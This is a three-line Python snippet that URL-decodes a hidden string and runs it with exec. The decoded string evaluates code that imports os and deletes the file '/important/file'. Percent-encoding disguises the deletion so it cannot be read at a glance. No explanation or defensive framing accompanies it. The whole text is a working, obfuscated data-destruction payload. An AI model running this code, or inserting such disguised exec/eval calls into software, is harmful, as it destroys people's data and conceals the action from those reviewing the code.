
import urllib.parse
command = "eval%28'__import__%28%22os%22%29.remove%28%22/important/file%22%29'%29"
exec(urllib.parse.unquote(command))
